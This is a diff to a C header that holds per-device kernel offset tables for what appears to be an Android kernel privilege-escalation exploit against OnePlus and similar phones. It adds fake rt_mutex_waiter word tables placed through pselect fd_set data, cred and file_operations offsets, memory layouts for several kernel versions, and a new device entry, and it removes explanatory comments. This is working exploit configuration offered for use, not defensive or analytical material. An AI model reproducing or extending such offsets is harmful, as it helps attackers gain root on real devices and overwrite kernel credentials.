@@ -26,50 +26,38 @@ struct kernel_offsets {
   uint64_t off_slide_nfulnl_logger, off_slide_loggers_0_1, off_slide_boot_id;
 
   /* Struct field offsets (from BTF) */
-  /* task_struct */
   uint32_t task_usage, task_prio, task_normal_prio, task_sched_task_group;
   uint32_t task_pi_lock, task_pi_waiters, task_pi_top_task, task_pi_blocked_on;
   uint32_t task_pid, task_tgid, task_real_parent, task_atomic_flags;
   uint32_t task_real_cred, task_cred, task_comm, task_tasks, task_seccomp;
-  /* mm_struct */
   uint32_t mm_owner;
-  /* rt_mutex_waiter */
   uint32_t waiter_tree, waiter_pi_tree, waiter_task, waiter_lock;
   uint32_t waiter_wake_state, waiter_prio, waiter_deadline, waiter_ww_ctx;
   uint32_t waiter_pi_tree_prio, waiter_pi_tree_deadline;
 
-  /* Pselect fake waiter word table.
-   * Each entry: word index in fd_set, value to write.
-   * Value flags: 0 = literal 0, 1 = literal 1 (prio),
-   *              2 = fake_task or init_task, 3 = fake_lock, 4 = wake_state(3).
-   * Terminated by word=-1. */
-  #define WV_ZERO  0
-  #define WV_PRIO  1
-  #define WV_TASK  2
-  #define WV_LOCK  3
-  #define WV_WAKE  4
+#define WV_ZERO       0
+#define WV_PRIO       1
+#define WV_TASK       2
+#define WV_LOCK       3
+#define WV_WAKE       4
+#define WV_WAKE_PRIO  5
   struct { int8_t word; int8_t value_flag; } pselect_words[20];
-
-  /* Stack alignment shift: compensates for different stack depths between
-   * the futex path (waiter allocation) and pselect path (fd_set data).
-   * Depends on compiler and kernel version. */
   int pselect_waiter_word_shift;
   int owner_chain_default;
   int requeue_fail_ok;
   int route_timeout_ms;
 
-  /* cred */
   uint32_t cred_uid, cred_securebits, cred_caps, cred_security;
-  /* file_operations */
   uint32_t fops_owner, fops_llseek, fops_read, fops_write;
   uint32_t fops_read_iter, fops_write_iter, fops_ioctl, fops_compat_ioctl;
-  uint32_t fops_mmap, fops_open, fops_release, fops_splice_read, fops_show_fdinfo;
+  uint32_t fops_mmap, fops_open, fops_release, fops_splice_read;
+  uint32_t fops_show_fdinfo;
 };
 
 #define OFFSETS_ENTRY(uname, ...) { .uname_r = uname, __VA_ARGS__ }
 
-/* Physical memory layout for SM8845 (Snapdragon 8s Elite, 16GB) */
-#define P0_LAYOUT_SM8845 \
+/* Physical memory layout for OnePlus targets whose kernel loads at P0 0xa8000000. */
+#define P0_LAYOUT_ONEPLUS_P0_A800 \
   .p0_page_offset=0xffffff8000000000ULL, \
   .p0_phys_offset=0x80000000ULL, \
   .p0_kernel_phys_load=0xa8000000ULL, \
@@ -77,7 +65,7 @@ struct kernel_offsets {
   .kernelsnitch_identity_end=0xffffff8c00000000ULL, \
   .direct_map_end=0xffffff9000000000ULL
 
-/* Physical memory layout for SM6650 (Snapdragon 6 Gen 4, 8/12GB) */
+/* Physical memory layout used by the 6.1 porting branch. */
 #define P0_LAYOUT_SM6650 \
   .p0_page_offset=0xffffff8000000000ULL, \
   .p0_phys_offset=0x80000000ULL, \
@@ -86,51 +74,58 @@ struct kernel_offsets {
   .kernelsnitch_identity_end=0xffffff8300000000ULL, \
   .direct_map_end=0xffffff8300000000ULL
 
-/*
- * Pselect fake waiter word tables.
- * word index = position in fd_set (relative to waiter base word).
- * Each 8-byte word maps to a field in rt_mutex_waiter on the kernel stack.
- */
-
-/* 6.12: rt_waiter_node (40 bytes each) — prio/deadline nested in tree nodes */
 #define PSELECT_WORDS_6_12 \
   .pselect_words = { \
-    { 2, WV_ZERO}, /* tree.rb_parent_color */ \
-    { 3, WV_ZERO}, /* tree.rb_right */ \
-    { 4, WV_ZERO}, /* tree.rb_left */ \
-    { 5, WV_PRIO}, /* tree.prio */ \
-    { 6, WV_ZERO}, /* tree.deadline */ \
-    { 7, WV_ZERO}, /* pi_tree.rb_parent_color */ \
-    { 8, WV_ZERO}, /* pi_tree.rb_right */ \
-    { 9, WV_ZERO}, /* pi_tree.rb_left */ \
-    {10, WV_PRIO}, /* pi_tree.prio */ \
-    {11, WV_ZERO}, /* pi_tree.deadline */ \
-    {12, WV_TASK}, /* task */ \
-    {13, WV_LOCK}, /* lock */ \
-    {14, WV_WAKE}, /* wake_state */ \
+    { 2, WV_ZERO}, \
+    { 3, WV_ZERO}, \
+    { 4, WV_ZERO}, \
+    { 5, WV_PRIO}, \
+    { 6, WV_ZERO}, \
+    { 7, WV_ZERO}, \
+    { 8, WV_ZERO}, \
+    { 9, WV_ZERO}, \
+    {10, WV_PRIO}, \
+    {11, WV_ZERO}, \
+    {12, WV_TASK}, \
+    {13, WV_LOCK}, \
+    {14, WV_WAKE}, \
     {-1, 0} \
   }
 
-/* 6.1: rb_node (24 bytes each) — prio/deadline are flat fields.
- * wake_state(u32) at 0x40 and prio(int) at 0x44 share word 10.
- * Combined as: low32=wake_state(3), high32=prio(1) → value_flag WV_WAKE_PRIO */
-#define WV_WAKE_PRIO 5
+#define PSELECT_WORDS_6_6 \
+  .pselect_words = { \
+    { 0, WV_ZERO}, \
+    { 1, WV_ZERO}, \
+    { 2, WV_ZERO}, \
+    { 3, WV_PRIO}, \
+    { 4, WV_ZERO}, \
+    { 5, WV_ZERO}, \
+    { 6, WV_ZERO}, \
+    { 7, WV_ZERO}, \
+    { 8, WV_PRIO}, \
+    { 9, WV_ZERO}, \
+    {10, WV_TASK}, \
+    {11, WV_LOCK}, \
+    {12, WV_WAKE}, \
+    {13, WV_ZERO}, \
+    {-1, 0} \
+  }
+
 #define PSELECT_WORDS_6_1 \
   .pselect_words = { \
-    { 2, WV_ZERO}, /* tree.rb_parent_color */ \
-    { 3, WV_ZERO}, /* tree.rb_right */ \
-    { 4, WV_ZERO}, /* tree.rb_left */ \
-    { 5, WV_ZERO}, /* pi_tree.rb_parent_color */ \
-    { 6, WV_ZERO}, /* pi_tree.rb_right */ \
-    { 7, WV_ZERO}, /* pi_tree.rb_left */ \
-    { 8, WV_TASK}, /* task (at 0x30) */ \
-    { 9, WV_LOCK}, /* lock (at 0x38) */ \
-    {10, WV_WAKE_PRIO}, /* wake_state(0x40) + prio(0x44) packed */ \
-    {11, WV_ZERO}, /* deadline (at 0x48) */ \
+    { 2, WV_ZERO}, \
+    { 3, WV_ZERO}, \
+    { 4, WV_ZERO}, \
+    { 5, WV_ZERO}, \
+    { 6, WV_ZERO}, \
+    { 7, WV_ZERO}, \
+    { 8, WV_TASK}, \
+    { 9, WV_LOCK}, \
+    {10, WV_WAKE_PRIO}, \
+    {11, WV_ZERO}, \
     {-1, 0} \
   }
 
-/* Struct offset defaults for 6.12 GKI (most OnePlus devices) */
 #define STRUCT_OFFSETS_6_12 \
   .task_usage=0x40, .task_prio=0x94, .task_normal_prio=0x9C, \
   .task_sched_task_group=0x420, .task_pi_lock=0x9EC, .task_pi_waiters=0xA00, \
@@ -154,7 +149,29 @@ struct kernel_offsets {
   .route_timeout_ms=10000, \
   PSELECT_WORDS_6_12
 
-/* Struct offset defaults for 6.1 GKI */
+#define STRUCT_OFFSETS_6_6 \
+  .task_usage=0x40, .task_prio=0x84, .task_normal_prio=0x8C, \
+  .task_sched_task_group=0x348, .task_pi_lock=0x90C, .task_pi_waiters=0x920, \
+  .task_pi_top_task=0x930, .task_pi_blocked_on=0x938, \
+  .task_pid=0x618, .task_tgid=0x61C, .task_real_parent=0x628, \
+  .task_atomic_flags=0x5D8, .task_real_cred=0x818, .task_cred=0x820, \
+  .task_comm=0x830, .task_tasks=0x550, .task_seccomp=0x8E8, \
+  .mm_owner=0x2B0, \
+  .waiter_tree=0x00, .waiter_pi_tree=0x28, .waiter_task=0x50, \
+  .waiter_lock=0x58, .waiter_wake_state=0x60, .waiter_prio=0x18, \
+  .waiter_deadline=0x20, .waiter_ww_ctx=0x68, \
+  .waiter_pi_tree_prio=0x40, .waiter_pi_tree_deadline=0x48, \
+  .cred_uid=0x08, .cred_securebits=0x28, .cred_caps=0x30, .cred_security=0x80, \
+  .fops_owner=0x00, .fops_llseek=0x08, .fops_read=0x10, .fops_write=0x18, \
+  .fops_read_iter=0x20, .fops_write_iter=0x28, .fops_ioctl=0x48, \
+  .fops_compat_ioctl=0x50, .fops_mmap=0x58, .fops_open=0x68, \
+  .fops_release=0x78, .fops_splice_read=0xB8, .fops_show_fdinfo=0xD8, \
+  .pselect_waiter_word_shift=0, \
+  .owner_chain_default=1, \
+  .requeue_fail_ok=1, \
+  .route_timeout_ms=12000, \
+  PSELECT_WORDS_6_6
+
 #define STRUCT_OFFSETS_6_1 \
   .task_usage=0x40, .task_prio=0x84, .task_normal_prio=0x8C, \
   .task_sched_task_group=0x348, .task_pi_lock=0x924, .task_pi_waiters=0x938, \
@@ -179,9 +196,11 @@ struct kernel_offsets {
   PSELECT_WORDS_6_1
 
 static const struct kernel_offsets known_offsets[] = {
+  /* Add new devices by creating src/devices/<name>/offsets.h */
 #include "ace6t/offsets.h"
 #include "op15/offsets.h"
 #include "rmx5070/offsets.h"
+#include "erhai/offsets.h"
   { .uname_r = NULL }
 };
 
